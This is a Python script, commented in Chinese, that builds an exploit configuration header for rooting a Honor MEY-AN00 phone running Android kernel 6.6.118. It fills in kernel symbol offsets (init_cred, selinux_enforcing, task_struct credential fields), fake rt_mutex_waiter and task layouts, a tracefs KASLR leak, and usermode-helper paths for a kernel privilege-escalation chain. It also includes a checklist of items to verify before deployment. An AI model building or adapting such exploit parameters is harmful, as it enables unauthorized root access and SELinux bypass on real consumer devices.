#!/usr/bin/env python3
# make_target_h.py -- 生成 MEY-AN00 的 exploit target.h
#
# 策略: 以 dc15 参考实现的 CGA-W00 6.1.157 target.h 为**底稿**,
#       仅替换"设备相关"项(符号偏移/结构体字段/蚊虫开关), 其余行为调参原样保留。
#       这样可保证源码引用的宏一个都不缺.
#
#   off = vaddr - KIMAGE_TEXT_BASE, KIMAGE_TEXT_BASE = _text = 0xffffffc080000000
#
# 数据来源:
#   - 符号偏移   : kallsyms_mey_an00.txt (recover_kallsyms.py, 110992 syms)
#   - 结构体字段 : 设备内嵌 BTF (dump_btf.py, 144042 types)
#   - tracefs    : docs/交接-临仵root-MEP-AN00.md §2.1 (已由 kallsyms 交叉校验)
import re, sys, os

ROOT = "D:/MEY-AN00-root-repro"
REF  = ROOT + "/exploit-src/dc15/target.h"
OUT  = ROOT + "/exploit-src/target_mey_an00.h"
BASE = 0xffffffc080000000
VERSION = "6.6.118-android15-8-gf17133276a57-abogki518694926-4k"

# ---------------------------------------------------------------- 设备相关覆盖项
OVERRIDE = {
  # 基准
  "KIMAGE_TEXT_BASE": "0xffffffc080000000ULL",

  # 符号偏移 (回收自 kallsyms)
  "INIT_TASK_OFF":                    "0x0217E280ULL",
  "ROOT_TASK_GROUP_OFF":              "0x02378980ULL",
  "SELINUX_ENFORCING_OFF":            "0x023BA418ULL",   # = selinux_state(厂商 enforcing@+0)
  "SELINUX_ENFORCING_BOOT_OFF":       "0x0211CAE8ULL",
  "ASHMEM_MISC_FOPS_OFF":             "0x022DE228ULL",   # ashmem_misc(0x022DE218)+0x10
  "ASHMEM_FOPS_OFF":                  "0x012FF898ULL",
  "ASHMEM_IOCTL_OFF":                 "0x004742E8ULL",
  "ASHMEM_READ_ITER_OFF":             "0x008AEEF0ULL",
  "ASHMEM_COMPAT_IOCTL_OFF":          "0x008AEFB0ULL",
  "ASHMEM_MMAP_OFF":                  "0x00474D04ULL",
  "ASHMEM_OPEN_OFF":                  "0x00474F34ULL",
  "ASHMEM_RELEASE_OFF":               "0x00474FBCULL",
  "ASHMEM_SHOW_FDINFO_OFF":           "0x008AF004ULL",
  "CONFIGFS_READ_ITER_OFF":           "0x00A310E0ULL",
  "CONFIGFS_BIN_WRITE_ITER_OFF":      "0x00A3160CULL",
  "COPY_SPLICE_READ_OFF":             "0x00675198ULL",
  "NOOP_LLSEEK_OFF":                  "0x0035E168ULL",
  "KMALLOC_CACHES_OFF":               "0x01698ED8ULL",
  "ANON_PIPE_BUF_OPS_OFF":            "0x01183CC8ULL",
  "MISC_LIST_NEXT_OFF":               "0x0229B190ULL",
  "UHID_MISC_OFF":                    "0x022D7C00ULL",
  "UHID_MISC_FOPS_OFF":               "0x022D7C10ULL",
  "UHID_FOPS_OFF":                    "0x012F1498ULL",
  "INIT_CRED_OFF":                    "0x02190790ULL",
  "PER_CPU_OFFSET_OFF":               "0x0216B658ULL",
  "RUNQUEUES_OFF":                    "0x0214A140ULL",
  "RT_SCHED_CLASS_OFF":               "0x01698050ULL",
  "FAIR_SCHED_CLASS_OFF":             "0x01698128ULL",
  "CALL_USERMODEHELPER_EXEC_WORK_OFF":"0x0092ECE4ULL",
  "SYSTEM_UNBOUND_WQ_OFF":            "0x0216AE60ULL",
  "SLIDE_SYSCTL_BOOTID_OFF":          "0x023DB420ULL",
  "SLIDE_NFULNL_LOGGER_OBJECT_OFF":   "0x02172260ULL",
  "SLIDE_NFULNL_LOGGER_NAME_OFF":     "0x015B66CCULL",   # TODO 待核（MEY 未用此路径）
  "SIG_ENFORCE_OFF":                  "0x00000000ULL",   # TODO 未导出 kallsyms，见 README
  "SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF": "0x0229B098ULL",
  "RANDOM_TABLE_UUID_DATA_PTR_OFF":   "0x0229B0D8ULL",

  # task_struct (BTF size 0x12c0)
  "TASK_REAL_CRED_OFF":   "0x0818ULL",
  "TASK_CRED_OFF":        "0x0820ULL",
  "TASK_COMM_OFF":        "0x0830ULL",
  "TASK_PID_OFF":         "0x0618ULL",
  "TASK_TGID_OFF":        "0x061CULL",
  "TASK_TASKS_OFF":       "0x0550ULL",
  "TASK_SCHED_CLASS_OFF": "0x0340ULL",

  # cred (BTF size 0xb8)
  "CRED_UID_OFF":        "0x0008ULL",
  "CRED_SECUREBITS_OFF": "0x0028ULL",
  "CRED_CAPS_OFF":       "0x0030ULL",
  "CRED_SECURITY_OFF":   "0x0080ULL",

  # struct rq (BTF size 0xf00) -- 关键: CGA 0xaa0, MEY 0xaa8
  "RQ_CURR_OFF": "0x0AA8ULL",

  # task_security_struct (BTF size 0x18)
  "SELINUX_CRED_OSID_OFF": "0x00ULL",
  "SELINUX_CRED_SID_OFF":  "0x04ULL",

  # rt_mutex_waiter (BTF size 0x70, MEY 非紧凑) -- 与交接文档 §2.3 逐字节一致
  "COMPACT_RT_MUTEX_WAITER":       "0",
  "FAKE_WAITER_PI_TREE_ENTRY_OFF": "0x0028ULL",
  "FAKE_WAITER_TASK_OFF":          "0x0050ULL",
  "FAKE_WAITER_LOCK_OFF":          "0x0058ULL",
  "FAKE_WAITER_WAKE_STATE_OFF":    "0x0060ULL",
  "FAKE_WAITER_PRIO_OFF":          "0x0018ULL",
  "FAKE_WAITER_DEADLINE_OFF":      "0x0020ULL",
  "FAKE_WAITER_WW_CTX_OFF":        "0x0068ULL",
  "FAKE_WAITER_LAYOUT_SIZE":       "0x0070ULL",
  "FAKE_WAITER_TREE_PRIO_OFF":     "0x0018ULL",
  "FAKE_WAITER_TREE_DEADLINE_OFF": "0x0020ULL",
  "FAKE_WAITER_PI_TREE_PRIO_OFF":    "0x0040ULL",
  "FAKE_WAITER_PI_TREE_DEADLINE_OFF":"0x0048ULL",

  # fake_task 用的 task_struct 字段 (BTF)
  "FAKE_TASK_USAGE_OFF":         "0x0040ULL",
  "FAKE_TASK_PRIO_OFF":          "0x0084ULL",
  "FAKE_TASK_NORMAL_PRIO_OFF":   "0x008CULL",
  "FAKE_TASK_TASK_GROUP_OFF":    "0x0348ULL",
  "FAKE_TASK_SCHED_CLASS_OFF":   "0x0340ULL",
  "FAKE_TASK_PI_LOCK_OFF":       "0x090CULL",
  "FAKE_TASK_PI_WAITERS_OFF":    "0x0920ULL",
  "FAKE_TASK_PI_TOP_TASK_OFF":   "0x0930ULL",
  "FAKE_TASK_PI_BLOCKED_ON_OFF": "0x0938ULL",

  # file_operations (BTF size 0x108)
  "FOPS_OWNER_OFF":       "0x0000ULL",
  "FOPS_LLSEEK_OFF":      "0x0008ULL",
  "FOPS_READ_OFF":        "0x0010ULL",
  "FOPS_WRITE_OFF":       "0x0018ULL",
  "FOPS_READ_ITER_OFF":   "0x0020ULL",
  "FOPS_WRITE_ITER_OFF":  "0x0028ULL",
  "FOPS_IOCTL_OFF":       "0x0048ULL",
  "FOPS_COMPAT_IOCTL_OFF":"0x0050ULL",
  "FOPS_MMAP_OFF":        "0x0058ULL",
  "FOPS_OPEN_OFF":        "0x0068ULL",
  "FOPS_RELEASE_OFF":     "0x0078ULL",
  "FOPS_SPLICE_READ_OFF": "0x00B8ULL",
  "FOPS_SHOW_FDINFO_OFF": "0x00D8ULL",

  # tracefs KASLR 泄漏 (交接文档 §2.1, 已用 kallsyms 校验: worker_thread 0x1856E8+0x17c)
  "SLIDE_TRACEFS_EVENT_ID":           "109",
  "SLIDE_TRACEFS_WORKER_CALLER_OFF":  "0x00185864ULL",
}

# 字符串字面量替换
LITERALS = [
  ('"cga-w00-6.1.157-honor-magicpad3-app"',      '"mey-an00-6.6.118-honor-magic-app"'),
  ('"cga-w00-6.1.157-honor-magicpad3-root-umh"', '"mey-an00-6.6.118-honor-magic-root-umh"'),
  ('"honor/CGA-W00/CGA-W00:16/CGA-W00.260608.005/16639103:user/release-keys"',
   '"honor/MEY-AN00/MEY-AN00:16/MEY-AN00.10.0.0.175:user/release-keys"'),
  ('"targets/cga-w00-6.1.157/p0_fingerprint.h"',
   '"targets/mey-an00-6.6.118/p0_fingerprint.h"'),
]

# 需在文件末尾追加的新宏
APPEND = [
  ("SLIDE_RANDOM_TABLE_OFF",    "0x0229AF90ULL", "random_table"),
  ("KALLSYMS_LOOKUP_NAME_OFF",  "0x007E011CULL", "kallsyms_lookup_name (运行时解析任意符号)"),
  ("MISC_LIST_OFF",             "0x0018ULL",     "miscdevice.list"),
  ("MISC_NAME_OFF",             "0x0008ULL",     "miscdevice.name"),
  ("MISC_FOPS_OFF",             "0x0010ULL",     "miscdevice.fops"),
]

TODO_LIST = """/* ===================== MEY-AN00 未校核清单（上线前必读） =====================
 *
 * [已 GM 校核] 符号偏移 / task_struct / cred / miscdevice / rt_mutex_waiter /
 *              file_operations / struct rq.curr / task_security_struct / selinux_state
 *              —— 全部由本设备 BTF + 恢复的 kallsyms 独立给出。
 *
 * [待校核 1] SIG_ENFORCE_OFF：本内核未导出 `sig_enforce`。
 *            现填 0x0 == _text，**绝不可直接写入**（会 panic）。
 *            若走到加载 .ko 的路径，必须先用 kallsyms_lookup_name 运行时解析，
 *            或在出 ELF(vmlinux-to-elf) 后从 symtab 取得再回填。
 *
 * [待校核 2] SLIDE_PSELECT_WORD_SHIFT（沿用 CGA 的 13）：
 *            该值由 __arm64_sys_futex/futex_wait_requeue_pi 的栈深度
 *            与 core_sys_select 的 stack_fds 深度之差决定，需对本机 Image
 *            做反汇编才能确定。交接文档已指出 MEY 的 pselect 路线尚未落地。
 *
 * [待校核 3] SLIDE_NFULNL_LOGGER_NAME_OFF（填 0x015B66CC）：
 *            为本机 Image 内 "nfnetlink_log" 字符串首次出现地址，未经语义确认。
 *
 * [待校核 4] 一切 APP_* / SLIDE_* / KERNELSNITCH_* 行为调参（MM_STRUCT_SZ、
 *            SLIDE_BANK_* 、FOPS_OFF、SKB_DATA_DELTA、P0_ORACLE_* 等）沿用 CGA
 *            6.1.157 的实测值。它们不是符号偏移，需在本机试跑后按 log 微调。
 *            特别是 MM_STRUCT_SZ=0x400 对应 slab order 与本机 mm_struct size
 *            0x4c0(BTF) 不一致，属于 KernelSnitch 喷射口径，务必实测校准。
 *
 * [待校核 5] P0_KERNEL_PHYS_LOAD / P0_PAGE_OFFSET / P0_PHYS_OFFSET：沿用 CGA
 *            (0xa8000000)，SM8750 平台是同一个值，但需一次 KASLR 实测确认 direct-map。
 * ========================================================================== */"""

def main():
    raw = open(REF, "rb").read().decode("utf-8")
    raw = raw.lstrip("\ufeff")
    text = raw

    for old, new in LITERALS:
        if old in text:
            text = text.replace(old, new)
        else:
            print("WARN literal not found:", old)

    applied = set()
    out = []
    for line in text.split("\n"):
        m = re.match(r"^(\s*#define\s+)([A-Za-z_][A-Za-z0-9_]*)(\s+)(.*)$", line)
        if m and m.group(2) in OVERRIDE:
            line = "%s%s%s%s" % (m.group(1), m.group(2), m.group(3), OVERRIDE[m.group(2)])
            applied.add(m.group(2))
        out.append(line)

    unused = sorted(set(OVERRIDE) - applied)
    if unused:
        print("WARN overrides not applied (ref 中无此宏):", unused)

    body = "\n".join(out)

    # 在 #endif 前追加新宏
    idx = body.rfind("#endif")
    extra = "\n".join("/* %s */\n#define %-30s %s" % (note, nm, val)
                      for nm, val, note in APPEND)
    if idx >= 0:
        body = body[:idx] + extra + "\n\n" + TODO_LIST + "\n\n" + body[idx:]

    header = """/* target_mey_an00.h -- Honor MEY-AN00 · MagicOS 10.0.0.175 · kernel %s
 *
 * 由 analysis/scripts/make_target_h.py 自动生成。
 * 底稿 = dc15 参考实现的 targets/cga-w00-6.1.157/target.h,
 *        仅替换设备相关项; 行为调参(APP_*/SLIDE_*/KERNELSNITCH_* 等)沿用 CGA。
 *
 *   符号偏移   <- kallsyms_mey_an00.txt (recover_kallsyms.py 从裸 Image 恢复, 110992 syms)
 *   结构体字段 <- 设备内嵌 BTF           (dump_btf.py 解析, 144042 types, final_pos==type_len)
 *   tracefs    <- docs/交接-临仵root-MEP-AN00.md §2.1 (已用 kallsyms 交叉校验一致)
 *
 *   off = vaddr - KIMAGE_TEXT_BASE, KIMAGE_TEXT_BASE = _text = 0xFFFFFFC080000000
 *   运行时地址 = KASLR_base + off
 *
 * 交叉校验全部通过: init_task 0x0217E280 / random_table 0x0229AF90 / sysctl_bootid 0x023DB420
 *                   worker_thread 0x1856E8+0x17c=0x185864 / rcu_gp_fqs_loop 0x289F4+0x144=0x28B38
 *
 * ⚠ 待核项见文件末尾 "MEY-AN00 未校核清单"。
 */
""" % VERSION

    open(OUT, "w", encoding="utf-8").write(header + body)
    print("wrote", OUT)
    print("applied overrides:", len(applied), "/", len(OVERRIDE))

if __name__ == "__main__":
    main()
